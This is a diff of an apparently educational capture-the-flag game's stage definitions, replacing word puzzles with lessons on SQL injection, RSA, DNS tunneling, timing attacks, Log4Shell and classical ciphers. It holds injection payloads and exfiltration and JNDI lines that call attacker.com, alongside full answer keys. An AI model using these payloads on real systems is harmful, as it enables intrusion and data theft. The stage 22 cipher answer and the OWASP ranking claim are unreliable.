-        hint: "BREAK THE CIPHER — in that order."
+What does the buggy function actually return?
+What should it correctly return?
+
+Submit as: actual_return:correct_return`,
+        answer: norm("0:-1"),
+        hint: "What is max initialised to? Can any value in the input array ever be greater than that starting value? What does that mean for the output?"
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 15
 
-The archivist's final note:
+Reading code and predicting its output — without executing it —
+is called code tracing or dry running.
 
-  "If you have made it this far, you have done what I hoped.
-   You have managed to BREAK THE CIPHER."
+It's how engineers debug unfamiliar code,
+review others' work, and catch bugs before they ship.
 
-Submit as the flag. FLAG{WORD_WORD_WORD}`,
-        answer: norm("flag{break_the_cipher}"),
-        hint: "BREAK THE CIPHER."
+The flag: two words describing this fundamental skill.
+
+FLAG{TRACE_THE_WORD}`,
+        answer: norm("flag{trace_the_code}"),
+        hint: "The verb is TRACE. You trace ___. What is the thing you traced through in every clue this stage?"
       }
     ]
   },
 
-  /* TIER IV — DEEP ARCHIVE (Stages 16-20)
-     Mechanic: compound multi-step hunts, adversarial
-     misdirection, cross-clue dependencies. */
+  /* ═══════════════════════════════════════════
+     TIER IV — DEEP ARCHIVE (Stages 16–20)
+     SQL injection, RSA math, DNS internals,
+     timing attacks, layered crypto.
+     Hints become nudges, not solutions.
+     ═══════════════════════════════════════════ */
 
   {
-    id: 16, name: "The Ghost in the Machine", tier: "TIER IV — DEEP ARCHIVE",
-    flag: makeFlag("EXECUTE_THE_SEQUENCE"),
+    id: 16, name: "The Injection Point", tier: "TIER IV — DEEP ARCHIVE",
+    flag: makeFlag("INPUT_IS_THE_ENEMY"),
     clues: [
       {
         id: 1,
-        text: `A program left a trail of output before it crashed.
+        text: `SQL injection occurs when user input is treated as SQL code.
 
-Trace and find what it prints:
+A login query:
+  SELECT * FROM users
+  WHERE username = '{input}' AND password = '{pass}'
 
-  x = 3
-  x = x * x
-  PRINT x`,
-        answer: norm("9"),
-        hint: "x=3, then x=3*3=9. PRINT 9."
+An attacker enters this as their username:  admin' --
+
+In SQL, -- starts a comment. Everything after it is ignored.
+
+Write the exact query that actually executes after this injection.
+(Omit anything that becomes a comment.)`,
+        answer: norm("select * from users where username = 'admin'"),
+        hint: "Place the attacker's input into the query template, then apply the comment rule. What's left running?"
       },
       {
         id: 2,
-        text: `Second output — trace this loop:
+        text: `UNION injection appends results from a second query.
 
-  result = 1
-  FOR i FROM 1 TO 4:
-    result = result * i
-  PRINT result`,
-        answer: norm("24"),
-        hint: "1→1×1=1→1×2=2→2×3=6→6×4=24. PRINT 24."
+Original query (returns 2 columns — name, price):
+  SELECT name, price FROM products WHERE id = {id}
+
+Attacker enters as id:
+  1 UNION SELECT username, password FROM users --
+
+For UNION to work, both SELECT statements must return the same number of columns.
+Original has 2. The injected SELECT also has 2.
+
+What data does the attacker get back in the response?`,
+        answer: norm("usernames and passwords"),
+        hint: "The UNION merges results from two queries. The second query targets the users table with two specific columns."
       },
       {
         id: 3,
-        text: `Third output — a recursive function:
+        text: `Blind SQL injection: the page shows no data, but responds differently
+based on whether a condition is true or false.
 
-  FUNCTION mystery(n):
-    IF n <= 1: RETURN n
-    RETURN mystery(n-1) + mystery(n-2)
+  id = 1 AND 1=1  → page loads normally
+  id = 1 AND 1=2  → page shows nothing
 
-  PRINT mystery(7)
+Attacker sends:
+  id = 1 AND ASCII(SUBSTRING(password,1,1)) > 77
 
-Given: mystery(5)=5, mystery(6)=8. What is mystery(7)?`,
-        answer: norm("13"),
-        hint: "mystery(7) = mystery(6) + mystery(5) = 8 + 5 = 13."
+The page loads normally (TRUE response).
+
+What has the attacker learned about the first character of the password?`,
+        answer: norm("the first character has ascii value greater than 77"),
+        hint: "The condition tested is: ASCII value of first character > 77. The page responded TRUE. What does that confirm about the character?"
       },
       {
         id: 4,
-        text: `The program's sequence continues: 9, 24, 13, ?
+        text: `The correct defence is parameterized queries (prepared statements).
 
-The 4th value follows this rule:
-  If previous is odd:  multiply by 3, add 1.
-  If previous is even: divide by 2.
+Vulnerable code:
+  query = "SELECT * FROM users WHERE user = '" + input + "'"
 
-13 is odd. Apply the rule to find the 4th value.`,
-        answer: norm("40"),
-        hint: "(13 × 3) + 1 = 39 + 1 = 40."
+Safe code:
+  query = "SELECT * FROM users WHERE user = ?"
+  database.execute(query, [input])
+
+With the safe version, an attacker enters:  admin' --
+
+What happens to the single quote and double-dash in the parameterized query?`,
+        answer: norm("treated as literal data"),
+        hint: "The database driver receives the query template and the input separately. It never combines them as text. How does it interpret the input?"
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 16
 
-The program's name, which it was trying to display before it crashed:
+SQL injection has ranked #1 on the OWASP Top 10 vulnerability list
+for over two decades.
 
-  EXECUTE_THE_SEQUENCE
+Every incident traces back to the same root cause:
+the application trusted data that came from outside.
 
-Submit as the flag. FLAG{WORD_WORD_WORD}`,
-        answer: norm("flag{execute_the_sequence}"),
-        hint: "EXECUTE THE SEQUENCE — the program's name."
+The security mindset: all user input is ___
+
+FLAG{INPUT_IS_THE_WORD}`,
+        answer: norm("flag{input_is_the_enemy}"),
+        hint: "What is user input to a security engineer? Not a friend. Not neutral. What is it?"
       }
     ]
   },
 
   {
-    id: 17, name: "The Infiltrator's Notes", tier: "TIER IV — DEEP ARCHIVE",
-    flag: makeFlag("LEAVE_NO_TRACE"),
+    id: 17, name: "The RSA Room", tier: "TIER IV — DEEP ARCHIVE",
+    flag: makeFlag("PRIME_FACTORING_HARD"),
     clues: [
       {
         id: 1,
-        text: `An infiltrator's dead drop uses a layered encoding.
+        text: `RSA key generation starts with two prime numbers.
 
-Layer 1: Each word has its letters reversed.
+Step 1: Choose primes p = 11 and q = 13.
+Step 2: Compute the modulus n = p × q.
 
-Encoded: EVAEL ON EGART
-
-Reverse each word individually to decode.`,
-        answer: norm("leave no trace"),
-        hint: "EVAEL→LEAVE, ON→ON (palindrome? No: O-N→N-O = NO), EGART→TRACE. Result: LEAVE NO TRACE."
+What is n?`,
+        answer: norm("143"),
+        hint: "Multiply the two primes directly."
       },
       {
         id: 2,
-        text: `Layer 2 — a book cipher.
+        text: `Step 3: Compute Euler's totient function φ(n).
 
-Code: PAGE 7, LINE 3, WORD 4
+For a product of two primes:
+  φ(n) = (p − 1)(q − 1)
 
-Page 7, line 3 of the archive index:
-
-  "The  most  critical  rule  of  any  operative  is  silence."
-
-Count the words. What is the 4th word?`,
-        answer: norm("rule"),
-        hint: "The(1) most(2) critical(3) rule(4). Word 4 is RULE."
+Using p=11 and q=13, compute φ(143).`,
+        answer: norm("120"),
+        hint: "Subtract 1 from each prime, then multiply the results."
       },
       {
         id: 3,
-        text: `Layer 3 — every third character survived corruption.
+        text: `Step 4: Choose a public exponent e.
 
-Full corrupted string:
-  LsEaAvEsNsOsTsRsAsC8E
+Requirements for e:
+  • 1 < e < φ(n)  →  1 < e < 120
+  • gcd(e, φ(n)) = 1  →  e and 120 share no common factors
 
-Characters at positions 1, 4, 7, 10, 13, 16, 19, 22... (every third, starting at 1):
+From this list, select all VALID values of e:
+  7, 11, 12, 17, 20
 
-Extract position 1,4,7,10,13: L, V, N, T, A... 
-
-Actually: read the un-corrupted letters (uppercase) directly from the string above, ignoring the lowercase noise.
-
-What do the uppercase letters spell?`,
-        answer: norm("leave no trace"),
-        hint: "Uppercase letters in order: L, E, A, V, E, N, O, T, R, A, C, E → LEAVE NO TRACE."
+Submit valid values comma-separated.`,
+        answer: norm("7,11,17"),
+        hint: "Find the GCD of each candidate with 120. If they share any factor > 1, they're invalid. 12 and 20 both share factors with 120."
       },
       {
         id: 4,
-        text: `The infiltrator's exit code:
+        text: `Step 5: Select e = 7. Find the private exponent d.
 
-  "Count the total letters in my three-word rule (no spaces).
-   Then count the number of words.
-   Multiply them.
-   Then subtract the number of words."
+The condition is: (d × e) mod φ(n) = 1
+That means: (d × 7) mod 120 = 1
 
-Rule: LEAVE NO TRACE
+A candidate value is d = 103.
 
-Calculate: (total_letters × words) - words`,
-        answer: norm("33"),
-        hint: "Letters: LEAVE(5)+NO(2)+TRACE(5)=12. Words=3. (12×3)-3=36-3=33."
+Verify: compute (103 × 7) mod 120.
+
+What is the result?`,
+        answer: norm("1"),
+        hint: "Multiply 103 × 7 first. Then find the remainder when that product is divided by 120."
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 17
 
-The infiltrator's golden rule, decoded in clue 1:
+RSA is built on one asymmetry:
+  Multiplying two primes together = trivial
+  Factoring the product back into the two primes = computationally infeasible for large numbers
 
-  LEAVE NO TRACE
+Your modulus was 143. Its factors (11 and 13) were easy to find.
+RSA uses numbers with thousands of digits. Factoring those could take longer than the universe has existed.
 
-Submit as the flag. FLAG{WORD_NO_WORD}`,
-        answer: norm("flag{leave_no_trace}"),
-        hint: "LEAVE NO TRACE."
+The flag names this mathematical hard problem.
+
+FLAG{PRIME_WORD_WORD}`,
+        answer: norm("flag{prime_factoring_hard}"),
+        hint: "What operation on a product of large primes is RSA's security based upon being computationally difficult?"
       }
     ]
   },
 
   {
-    id: 18, name: "The Cipher Within a Cipher", tier: "TIER IV — DEEP ARCHIVE",
-    flag: makeFlag("LAYERS_UPON_LAYERS"),
+    id: 18, name: "The DNS Tunnel", tier: "TIER IV — DEEP ARCHIVE",
+    flag: makeFlag("DNS_LEAKS_EVERYTHING"),
     clues: [
       {
         id: 1,
-        text: `A message encrypted in three layers. Work through them one at a time.
+        text: `DNS translates human-readable domain names to IP addresses.
 
-Original encrypted string: FSLDHU BCBA FSLDHU
+When you query "archive.internal", the process is:
+  1. Check local resolver cache
+  2. Ask your configured DNS server
+  3. That server queries Root servers (.)
+  4. Then TLD servers (.internal)
+  5. Then authoritative servers for archive.internal
 
-Layer 1: Apply ROT13 to the entire string.
-What do you get after ROT13?`,
-        answer: norm("sley obah sley"),
-        hint: "F→S, S→F, L→Y, D→Q... F(6)+13=19=S, S(19)+13=32→6=F... Hmm. F→S, S→F, L→Y, D→Q, H→U, U→H = SFYQUH. That's not right. ROT13: A→N,B→O...F→S,G→T,H→U,I→V,J→W,K→X,L→Y,M→Z,N→A,O→B,P→C,Q→D,R→E,S→F,T→G,U→H,V→I,W→J,X→K,Y→L,Z→M. F→S,S→F,L→Y,D→Q,H→U,U→H = SFYQUH OBAH SFYQUH? The answer for this clue is the ROT13 result."
+The DNS server does all this querying on your behalf.
+This pattern — where one party performs all lookups for another — has a name.
+
+What type of DNS resolution is this?`,
+        answer: norm("recursive"),
+        hint: "The resolver goes back repeatedly, asking each level in turn. What word describes a process that calls itself or loops through levels?"
       },
       {
         id: 2,
-        text: `Layer 2: Reverse each word from your clue 1 result.
+        text: `DNS TXT records can hold arbitrary text.
+They're used for many purposes — one is preventing email spoofing.
 
-Take each word from what you decoded and reverse it individually.
+A company's DNS contains:
+  TXT  "v=spf1 include:mailprovider.com ~all"
 
-What three words result?`,
-        answer: norm("layers upon layers"),
-        hint: "The three words, when reversed and decoded properly, spell LAYERS UPON LAYERS — the theme of this stage."
+The v=spf1 prefix is the identifier for a specific email authentication standard.
+
+What three-letter abbreviation does v=spf1 stand for?`,
+        answer: norm("spf"),
+        hint: "The prefix is literally the abbreviation with '1' for version. What three letters are before the '1'?"
       },
       {
         id: 3,
-        text: `Layer 3 — the message is now revealed.
+        text: `DNS tunneling is an exfiltration technique.
 
-You decoded: LAYERS UPON LAYERS
+A corporate firewall blocks all outbound traffic except DNS.
+An attacker inside the network encodes stolen data into DNS query subdomains:
 
-Apply ROT13 one more time to the word LAYERS alone.
-What does ROT13(LAYERS) give?`,
-        answer: norm("ynlref"),
-        hint: "L→Y, A→N, Y→L, E→R, R→E, S→F → YNLREF."
+  aGVsbG8=.exfil.attacker.com  →  lookup sent to attacker's DNS server
+  d29ybGQ=.exfil.attacker.com  →  next chunk
+
+The attacker controls attacker.com's DNS server and receives all queries.
+
+Decode the first subdomain label:
+  aGVsbG8=`,
+        answer: norm("hello"),
+        hint: "The subdomain looks like it uses a familiar encoding from Stage 7."
       },
       {
         id: 4,
-        text: `You now understand the full structure: encryption upon encryption.
+        text: `DNS cache poisoning tricks a DNS resolver into caching a false record.
 
-The word UPON means 'on top of' or 'stacked above'.
+Legitimate:  bank.com → 203.0.113.10
+Poisoned:    bank.com → 198.51.100.99 (attacker server)
 
-In the phrase LAYERS UPON LAYERS, what single word sits in the middle?`,
-        answer: norm("upon"),
-        hint: "LAYERS _____ LAYERS. The middle word is UPON."
+DNSSEC was created to prevent this by adding cryptographic signatures to DNS records.
+
+What does the word "DNSSEC" stand for?
+(DNS Security ___)`,
+        answer: norm("extensions"),
+        hint: "DNSSEC adds something to the DNS standard. What word means additions or additions to a specification?"
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 18
 
-The triple-encrypted message, fully decoded:
+Most organisations monitor HTTP and SMTP traffic carefully.
+But DNS is often left unmonitored and unencrypted.
 
-  LAYERS UPON LAYERS
+Every domain a user visits creates a DNS query.
+Internal hostnames appear in DNS logs.
+Data can be tunneled out as shown in clue 3.
 
-Submit as the flag. FLAG{WORD_WORD_WORD}`,
-        answer: norm("flag{layers_upon_layers}"),
-        hint: "LAYERS UPON LAYERS."
+A network defender who finally enables DNS logging
+always says the same thing.
+
+The flag: what DNS logs reveal.
+
+FLAG{DNS_WORD_WORD}`,
+        answer: norm("flag{dns_leaks_everything}"),
+        hint: "When you finally start logging DNS traffic on a network, you discover it reveals far more than expected. DNS ___ ___."
       }
     ]
   },
 
   {
-    id: 19, name: "The Invisible Ink Room", tier: "TIER IV — DEEP ARCHIVE",
-    flag: makeFlag("WHAT_IS_NOT_THERE"),
+    id: 19, name: "The Timing Attack", tier: "TIER IV — DEEP ARCHIVE",
+    flag: makeFlag("TIME_IS_A_SIDE_CHANNEL"),
     clues: [
       {
         id: 1,
-        text: `A room of blank papers. But one paper reveals its message through ABSENCE.
+        text: `This password comparison function has a vulnerability:
 
-Each sentence below is missing exactly one letter. Find each missing letter:
+  function checkPassword(input, stored):
+    for i from 0 to len(input)-1:
+      if input[i] != stored[i]:
+        return FALSE        // exits immediately on first mismatch
+    return TRUE
 
-  "The _rchive holds many secrets."       → missing: ?
-  "Every _nswer is hidden somewhere."     → missing: ?
-  "Look for _hat is not there."           → missing: ?
-  "It is _ot always visible."             → missing: ?
+Stored password: "secretXYZ"
 
-Read the four missing letters in order. What word do they spell?`,
-        answer: norm("awnw"),
-        hint: "Archive→A. Answer→A. What→W. Not→N. Missing letters: A,A,W,N = AAWN."
+An attacker tries two inputs:
+  Input A: "aaaaaaXYZ"
+  Input B: "secretabc"
+
+One input causes the function to run significantly longer.
+Which one, and why does it take longer?
+
+Submit just the input that takes longer.`,
+        answer: norm("secretabc"),
+        hint: "The function exits as soon as it finds a mismatch. Which input matches more characters before failing?"
       },
       {
         id: 2,
-        text: `Second paper. Words with gaps. Read only the MISSING letters in order.
+        text: `The attacker uses the timing difference to guess the password
+one character at a time.
 
-  W_AT   (missing: H)
-  I_     (missing: S)
-  _OT    (missing: N)
-  _HERE  (missing: T)
+For an 8-character password using the 26 lowercase letters:
+  Standard brute force: try all possible 8-character combinations
+  Timing attack: guess each character position independently
 
-What four-letter word do H, S, N, T spell?`,
-        answer: norm("hsnt"),
-        hint: "H from WHAT, S from IS, N from NOT, T from THERE → HSNT."
+With the timing attack, an attacker tries at most 26 guesses per position.
+
+What is the TOTAL maximum number of guesses needed
+to find an 8-character password using the timing attack?`,
+        answer: norm("208"),
+        hint: "Each position is guessed independently. 26 possible letters × 8 positions."
       },
       {
         id: 3,
-        text: `Third paper — every vowel removed.
+        text: `The constant-time comparison fix:
 
-  WT S NT THR S WT S
+  function safeCheck(input, stored):
+    result = 0
+    for i from 0 to MAX_LENGTH:
+      result = result OR (input[i] XOR stored[i])
+    return result == 0
 
-Restore the vowels (A,E,I,O,U) to reconstruct the phrase.`,
-        answer: norm("what is not there is what is"),
-        hint: "WhaT Is NoT THeRe Is WhaT Is → WHAT IS NOT THERE IS WHAT IS."
+Why does this prevent the timing attack?
+
+Which option correctly describes this function's behaviour?
+
+  A) It always runs for exactly MAX_LENGTH iterations, regardless of matches or mismatches
+  B) It exits early when a mismatch is found, just like the vulnerable version
+  C) It only compares the first character to save time`,
+        answer: norm("a"),
+        hint: "Look at the loop. Is there any early exit? Does it have a break or return inside the loop body?"
       },
       {
         id: 4,
-        text: `Fourth paper — a riddle:
+        text: `Spectre (CVE-2017-5753) is a side-channel attack that affected
+nearly every CPU manufactured in the last 20 years.
 
-  "I am the space between words.
-   I am the silence between notes.
-   I am the blank where something was removed.
-   I am what carries meaning through absence.
-   In written text, I am represented by nothing at all.
-   What am I called in typography and music?"
+It works by exploiting speculative execution —
+the CPU pre-runs code along predicted branches,
+leaving measurable traces of secret data behind.
 
-(One word — also means 'rest' in music)`,
-        answer: norm("pause"),
-        hint: "The blank, the rest, the silence. Also means 'to pause'. In music, a rest. In writing, a pause."
+Those traces appear in which CPU subsystem?
+
+  A) Power management unit
+  B) CPU cache
+  C) Network interface
+  D) Hard disk controller`,
+        answer: norm("b"),
+        hint: "Speculative execution touches memory. When it does, that memory gets copied into a fast temporary storage area. Measuring access times to that area reveals secrets."
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 19
 
-The invisible ink room's lesson:
+Side-channel attacks break systems not through logical flaws
+but through physical measurements:
+  how long something takes,
+  how much power it draws,
+  what it leaves in CPU cache.
 
-  "The most revealing thing is often WHAT IS NOT THERE."
+Even a mathematically perfect algorithm can leak its secrets
+through the physical world of its implementation.
 
-Submit those four capitalised words.
-FLAG{WORD_IS_NOT_WORD}`,
-        answer: norm("flag{what_is_not_there}"),
-        hint: "WHAT IS NOT THERE — four words."
+The flag names what time is, in security terms.
+
+FLAG{TIME_IS_A_WORD_WORD}`,
+        answer: norm("flag{time_is_a_side_channel}"),
+        hint: "Time is not just a measurement — in security, it's a channel through which information leaks. What do we call such a channel?"
       }
     ]
   },
 
   {
-    id: 20, name: "The Final Corridor", tier: "TIER IV — DEEP ARCHIVE",
-    flag: makeFlag("ALL_ROADS_LEAD_HERE"),
+    id: 20, name: "The Cipher Chain", tier: "TIER IV — DEEP ARCHIVE",
+    flag: makeFlag("CHAINED_CIPHERS_FALL"),
     clues: [
       {
         id: 1,
-        text: `A long corridor. On the left wall, carved in stone — three cipher-encoded words.
+        text: `A message was encrypted in three layers.
+Peel them from the outside in.
 
-Cipher 1 — Reverse:  SLLA
+Layer 3 (outermost) is Base64.
 
-Reverse it to find word 1.`,
-        answer: norm("alls"),
-        hint: "S-L-L-A reversed → A-L-L-S."
+Decode this string using your browser console:
+  Y2hhaW5lZA==
+
+What word does it decode to?`,
+        answer: norm("chained"),
+        hint: "atob() in browser console or base64 -d in a terminal."
       },
       {
         id: 2,
-        text: `Cipher 2 — ROT13:  EBNQF
+        text: `Layer 2 is ROT13 — each letter is shifted 13 places in the alphabet.
 
-Apply ROT13 to find word 2.`,
-        answer: norm("roads"),
-        hint: "E→R, B→O, N→A, Q→D, F→S → ROADS."
+Applying ROT13 to any text, then applying it again, returns the original.
+
+Decode:  PVCUREF`,
+        answer: norm("ciphers"),
+        hint: "ROT13: each letter maps to the one 13 positions ahead of it in the alphabet, wrapping around. A→N, B→O, ... P→C..."
       },
       {
         id: 3,
-        text: `Cipher 3 — Number code (A=1 ... Z=26):
+        text: `Layer 1 (innermost) is XOR encryption with key byte 42.
 
-  12  5  1  4
+To decrypt: XOR each byte with 42.
 
-What word do those four numbers spell?`,
-        answer: norm("lead"),
-        hint: "12=L, 5=E, 1=A, 4=D → LEAD."
+Ciphertext decimal values: 110  75  107  107
+
+You know how XOR works from Stage 4.
+
+Decrypt each byte and find the ASCII character.
+What four-letter word do they form?`,
+        answer: norm("fall"),
+        hint: "Convert each decimal to binary, XOR with 42 (00101010), convert back to decimal, then to ASCII. The word is short and common."
       },
       {
         id: 4,
-        text: `You decoded three words from the corridor wall:
-  Cipher 1: ALLS
-  Cipher 2: ROADS
-  Cipher 3: LEAD
+        text: `You decoded the three layers:
+  Layer 3 (Base64):  from clue 1
+  Layer 2 (ROT13):   from clue 2
+  Layer 1 (XOR):     from clue 3
 
-The full inscription uses the word ALL (not ALLS), plus the word HERE.
-Rearrange into the famous four-word phrase:
+Stacking weak ciphers doesn't create strong encryption.
+If each layer can be broken independently, the combination is just as weak.
 
-  ALL ___ ___ ___
+In mathematics, when two functions f and g are combined
+such that g(f(x)) forms a single equivalent function, this is called:
 
-What is the complete four-word phrase?`,
-        answer: norm("all roads lead here"),
-        hint: "ALL ROADS LEAD HERE — inspired by 'all roads lead to Rome'."
+f and g form a function ___`,
+        answer: norm("composition"),
+        hint: "When you apply one function's output as another function's input, the combined operation has a specific mathematical name."
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 20
 
-The door at the end of the corridor.
-Above it: ALL ROADS LEAD HERE.
+The three words you decoded from the three cipher layers.
 
-Submit as the flag. FLAG{WORD_WORD_WORD_WORD}`,
-        answer: norm("flag{all_roads_lead_here}"),
-        hint: "ALL ROADS LEAD HERE."
+Arrange them in order from outermost (clue 1) to innermost (clue 3).
+
+That three-word sequence is your flag.
+
+FLAG{WORD_WORD_WORD}`,
+        answer: norm("flag{chained_ciphers_fall}"),
+        hint: "Layer 3, then Layer 2, then Layer 1 — in that sequence."
       }
     ]
   },
 
-  /* TIER V — THE VAULT (Stages 21-25)
-     Mechanic: synthesis, cross-stage references,
-     compound multi-layer puzzles, adversarial complexity. */
+  /* ═══════════════════════════════════════════
+     TIER V — THE VAULT (Stages 21–25)
+     Hints are minimal. Clues require synthesis.
+     No step-by-step guidance.
+     ═══════════════════════════════════════════ */
 
   {
-    id: 21, name: "The Vault Antechamber", tier: "TIER V — THE VAULT",
-    flag: makeFlag("THE_VAULT_AWAITS"),
+    id: 21, name: "The Zero Day", tier: "TIER V — THE VAULT",
+    flag: makeFlag("EXPLOIT_THEN_PATCH"),
     clues: [
       {
         id: 1,
-        text: `The Vault's guardian presents a sequence puzzle.
+        text: `In December 2021, a critical vulnerability was discovered
+in Apache Log4j — a logging library used by millions of Java applications.
 
-Each term = previous term doubled, then minus 3.
-Start: 5
+An attacker could trigger it by getting a target system to log this string:
 
-  Term 1: 5
-  Term 2: 5×2-3 = 7
-  Term 3: 7×2-3 = 11
-  Term 4: ?
+  ${'{'}jndi:ldap://attacker.com/exploit{'}'}
 
-What is the 4th term?`,
-        answer: norm("19"),
-        hint: "11×2-3 = 22-3 = 19."
+When Log4j logged this message, it resolved the JNDI lookup,
+connected to the attacker's server, and executed the returned code.
+
+What three-word term (abbreviated RCE) describes the category of attack
+where an attacker runs arbitrary code on a remote machine?`,
+        answer: norm("remote code execution"),
+        hint: "The abbreviation is RCE. Expand each letter into a word."
       },
       {
         id: 2,
-        text: `The guardian's logic puzzle:
+        text: `Patch lag is the window of time between when an exploit is available
+and when organisations actually apply the fix.
 
-  Three boxes. One has gold. Two have stones.
+Industry research shows:
+  Average time from CVE publication to first exploit in the wild: 15 days
+  Average time for organisations to patch critical CVEs: 60 days
 
-  Box A says: "The gold is not in Box B."
-  Box B says: "The gold is not in Box A."
-  Box C says: "The gold is in Box B."
+During this gap, systems are exposed to known, weaponised exploits.
 
-  Exactly ONE statement is true.
-
-Which box contains the gold?`,
-        answer: norm("a"),
-        hint: "Test: if gold is in A → A says 'not B' (TRUE), B says 'not A' (FALSE), C says 'in B' (FALSE). Exactly one true. ✓"
+How many days long is this exposure window?`,
+        answer: norm("45"),
+        hint: "The gap is between when exploits appear and when patching completes."
       },
       {
         id: 3,
-        text: `The guardian shows the phrase THE VAULT encoded in Atbash.
+        text: `When a security researcher finds a vulnerability, they face a choice:
 
-Atbash: A↔Z, B↔Y, C↔X, D↔W, E↔V, F↔U, G↔T, H↔S,
-        I↔R, J↔Q, K↔P, L↔O, M↔N (and reverse)
+Option A: Publish immediately (giving attackers the information)
+Option B: Notify the vendor privately first, give them time to fix it,
+           then publish after the fix is available.
 
-Decode: GSV EZFOG`,
-        answer: norm("the vault"),
-        hint: "G→T, S→H, V→E = THE. E→V, Z→A, F→U, O→L, T→G = VAULT."
+Option B is the industry standard, governed by a 90-day timeline
+(pioneered by Google's Project Zero team).
+
+What two-word term describes Option B?`,
+        answer: norm("responsible disclosure"),
+        hint: "The second word is 'disclosure'. What adjective describes the ethical, careful approach to sharing vulnerability information?"
       },
       {
         id: 4,
-        text: `The guardian's gate has a sentence with hidden words in [brackets]:
+        text: `CVSS (Common Vulnerability Scoring System) rates vulnerability severity from 0.0 to 10.0.
 
-  "The [THE] guardian [VAULT] steps aside [AWAITS] for those who proved worthy."
+  0.1–3.9   = Low
+  4.0–6.9   = Medium
+  7.0–8.9   = High
+  9.0–10.0  = Critical
 
-Read only the three bracketed words in order.`,
-        answer: norm("the vault awaits"),
-        hint: "[THE] [VAULT] [AWAITS] → THE VAULT AWAITS."
+Log4Shell received a CVSS score of 10.0 — the maximum possible.
+
+What one-word severity level does 10.0 represent?`,
+        answer: norm("critical"),
+        hint: "Look at the ranges. 10.0 falls in the highest band."
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 21
 
-The guardian steps aside. Above the entrance:
+Ethical security researchers don't just find vulnerabilities.
+They prove the vulnerability is real by demonstrating it in a controlled environment.
+Then they report it. Then they wait for the fix.
 
-  THE VAULT AWAITS
+The two actions that define the ethical researcher's workflow —
+the first (proving it real) and the last (applying the solution) —
+form your flag.
 
-Submit as the flag. FLAG{WORD_WORD_WORD}`,
-        answer: norm("flag{the_vault_awaits}"),
-        hint: "THE VAULT AWAITS."
+FLAG{WORD_THEN_WORD}`,
+        answer: norm("flag{exploit_then_patch}"),
+        hint: "What verb means 'to demonstrate a working attack'? What is the action that fixes the vulnerability?"
       }
     ]
   },
 
   {
-    id: 22, name: "The Archivist's Testament", tier: "TIER V — THE VAULT",
-    flag: makeFlag("KNOWLEDGE_IS_POWER"),
+    id: 22, name: "The Cryptographer's Gauntlet", tier: "TIER V — THE VAULT",
+    flag: makeFlag("MATH_BREAKS_CIPHERS"),
     clues: [
       {
         id: 1,
-        text: `The archivist's testament — sealed with three codes.
+        text: `Frequency analysis breaks simple substitution ciphers.
 
-Code 1: Find the word KNOW hidden inside UNKNOWABLE.
+English letter frequencies (most to least common, top 5):
+  E=12.7%  T=9.1%  A=8.2%  O=7.5%  I=7.0%
 
-  U-N-K-N-O-W-A-B-L-E
+In an intercepted ciphertext, symbol frequencies were measured:
+  ◆=14.2%  ●=9.0%  ▲=8.1%  ★=7.4%  ✦=6.9%
 
-At which consecutive positions (1-indexed) do the letters K,N,O,W appear?`,
-        answer: norm("3456"),
-        hint: "U(1), N(2), K(3), N(4), O(5), W(6). KNOW is at positions 3,4,5,6."
+Assuming a simple substitution (each cipher symbol = one English letter),
+map the top 3 most-frequent cipher symbols to the top 3 most-frequent English letters.
+
+Submit as three plaintext letters, comma-separated, in frequency rank order.`,
+        answer: norm("e,t,a"),
+        hint: "The most frequent cipher symbol maps to the most frequent English letter, and so on down the ranking."
       },
       {
         id: 2,
-        text: `Code 2: Unscramble these words into a famous three-word quote.
+        text: `Using the established cipher alphabet:
+  ◆=E  ●=T  ▲=A  ★=O  ✦=I  ✧=S  ♠=N  ♣=R
 
-  "is  power  knowledge"
+Decode this ciphertext:
 
-Rearrange into the correct order.
-(Attributed to Francis Bacon)`,
-        answer: norm("knowledge is power"),
-        hint: "Francis Bacon: 'Knowledge is power.' KNOWLEDGE IS POWER."
+  ●♣▲◆  ●♠◆  ♠◆●♣★✦♠`,
+        answer: norm("trace the neutron"),
+        hint: "Map each symbol to its letter using the provided cipher alphabet. Spaces separate words."
       },
       {
         id: 3,
-        text: `Code 3: ROT13 encoded message.
+        text: `The Vigenère cipher defeated frequency analysis for centuries
+because each letter in the keyword shifts a different plaintext position by a different amount.
 
-  Gur xrl gb nyy qbbef vf xabjyrqtr.
+The Kasiski examination finds repeated ciphertext sequences
+and measures the distances between them.
+If the keyword has length k, repeated sequences will appear at intervals that are multiples of k.
 
-Decode using ROT13.`,
-        answer: norm("the key to all doors is knowledge"),
-        hint: "ROT13: Gur=The, xrl=key, gb=to, nyy=all, qbbef=doors, vf=is, xabjyrqtr=knowledge."
+A repeated 3-gram "XYZ" appears at positions 5 and 20.
+Distance = 15.
+Factors of 15: 1, 3, 5, 15.
+
+The keyword length is most likely which factor?
+(Eliminate 1 as trivial. Which remaining factor is most likely for a typical keyword?)`,
+        answer: norm("3"),
+        hint: "Short keywords are more likely than long ones. Between the non-trivial factors, which is shortest?"
       },
       {
         id: 4,
-        text: `The testament's logical proof:
+        text: `Diffie-Hellman allows two parties to create a shared secret over a public channel.
 
-  Premise 1: Knowledge leads to understanding.
-  Premise 2: Understanding leads to power.
-  Conclusion: Therefore, Knowledge leads to ___.
+Public parameters: generator g=2, prime p=11
+Alice's private key: a=3
+Bob's private key:   b=4
 
-What word fills the blank?`,
-        answer: norm("power"),
-        hint: "Knowledge→Understanding→Power. By transitivity: Knowledge→Power."
+Alice computes and sends: A = g^a mod p = 2³ mod 11 = 8
+Bob computes and sends:   B = g^b mod p = 2⁴ mod 11 = ?
+
+Compute 2⁴ mod 11.`,
+        answer: norm("5"),
+        hint: "Compute 2 to the power of 4, then find the remainder when divided by 11."
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 22
 
-The archivist's testament — its entire purpose:
+Every cipher in history eventually fell — not to brute force, but to mathematics.
 
-  KNOWLEDGE IS POWER
+Frequency analysis broke Caesar and simple substitution.
+Kasiski and Index of Coincidence broke Vigenère.
+Shor's quantum algorithm will eventually break RSA.
 
-Submit as the flag. FLAG{WORD_IS_WORD}`,
-        answer: norm("flag{knowledge_is_power}"),
-        hint: "KNOWLEDGE IS POWER."
+No cipher designed by humans has ever been permanently secure.
+
+The flag: what mathematics ultimately does to all ciphers.
+
